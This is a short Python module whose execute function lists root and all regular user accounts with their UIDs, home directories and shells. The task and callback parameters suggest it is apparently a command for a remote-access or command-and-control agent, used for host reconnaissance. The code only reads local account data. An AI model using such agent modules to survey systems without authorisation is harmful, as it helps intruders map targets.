import pwd


# Lists root and all human user accounts (UID >= 1000) with their uid, home dir, and shell
def execute(params, task_id, callback_id):
    try:
        users = []
        for p in pwd.getpwall():
            if p.pw_uid >= 1000 or p.pw_name == "root":
                users.append(
                    f"{p.pw_name:<20} uid={p.pw_uid:<6} home={p.pw_dir}  shell={p.pw_shell}"
                )
        return "\n".join(users) if users else "no users found"
    except Exception as e:
        return f"users error: {str(e)}"
